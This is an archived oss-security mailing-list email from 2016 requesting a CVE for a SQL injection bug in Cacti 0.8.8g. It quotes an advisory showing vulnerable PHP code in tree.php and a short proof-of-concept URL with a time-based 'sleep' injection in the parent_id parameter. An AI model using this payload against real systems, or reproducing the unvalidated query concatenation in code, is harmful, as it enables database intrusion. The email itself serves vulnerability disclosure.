X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3318" "Thursday" "10" "March" "2016" "17:06:32" "+0100" "Paul Gevers" "elbrus@debian.org" "<56E19B88.3000908@debian.org>" "87" "[oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability" nil nil nil "3" "2016031016:06:32" "[oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability" (number mark "U       elbrus@debia Mar 10   87/3318  " thread-indent "\"[oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30252 invoked by uid 550); 10 Mar 2016 16:06:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30234 invoked from network); 10 Mar 2016 16:06:50 -0000
X-Brand: 4ZrJ
To: oss-security@lists.openwall.com
From: Paul Gevers <elbrus@debian.org>
X-Enigmail-Draft-Status: N1110
Message-ID: <56E19B88.3000908@debian.org>
Date: Thu, 10 Mar 2016 17:06:32 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Icedove/38.6.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2"
X-OriginalArrivalTime: 10 Mar 2016 16:06:39.0040 (UTC) FILETIME=[D4202C00:01D17AE6]
X-RcptDomain: lists.openwall.com
Subject: [oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability

--Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Hi

I just found the description below about an sql vulnerability in the
cacti bug tracker: http://bugs.cacti.net/view.php?id=3D2667

Can a CVE be assigned for this issue?
Thanks

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D
Advisory: Cacti SQL Injection Vulnerability
Author: Do9gy of Tencent Security Platform Department
Affected Version: 0.8.8.g(the latest version & the older versions)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D
Vulnerability Description
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

Recetly, I found a SQL Injection Vulnerability in =E2=80=98Cacti-0.8.8g'
program, Cacti is widely used in many companies.
Vulnerable file: /cacti/tree.php:
line 208:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
    switch ($current_type) {
    case TREE_ITEM_TYPE_HEADER:
        $i =3D 0;
        /* it's nice to default to the parent sorting style for new items */
        if (empty($_GET["id"])) {
            $default_sorting_type =3D db_fetch_cell("select
sort_children_type from graph_tree_items where id=3D" . $_GET["parent_id"]);
        }else{
            $default_sorting_type =3D TREE_ORDERING_NONE;
        }

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The parameter parent_id is used without any validation.
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D
POC && EXP
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D
1. Login

2.
http://target/cacti-0.8.8g/tree.php?action=3Ditem_edit&tree_id=3D2&parent_i=
d=3D8%20and%20sleep(1)
[^]

3. mysql log: select sort_children_type from graph_tree_items where id=3D8
and sleep(1)



--Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQEcBAEBCAAGBQJW4ZuJAAoJEJxcmesFvXUKPdUH/1nIzNbGvbMd29Ae3SW3Tck3
WujXAP7xb1Vo/7S/tK4fBeoRzbJQZcfNGloaDS9FLwH9JiEluJCP5eomrYfBc+Om
qshW55pPDlVJktBBc62LV1ZWYLyrHeee3nmccKSZYAQkMp4yOyqpJwDTuCehLgFr
0/b4ijQCPDIi0bW8NVXE+qjxPgyPRVrjEWF0OH1NwXPALT0uJgwzI4rAfM8ous3J
ox7JWK2d3yIUWXA1nC3JJjV/ucgIF3NOXxGOKhwMpcok06PXJC2w/tKywAb8p4+3
joDCzxC+iqQRY6vgWt+2Allxq8TS9khbs2EYb+an1PmkWe3+Jr3MHqf+BnFuexs=
=lf80
-----END PGP SIGNATURE-----

--Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2--
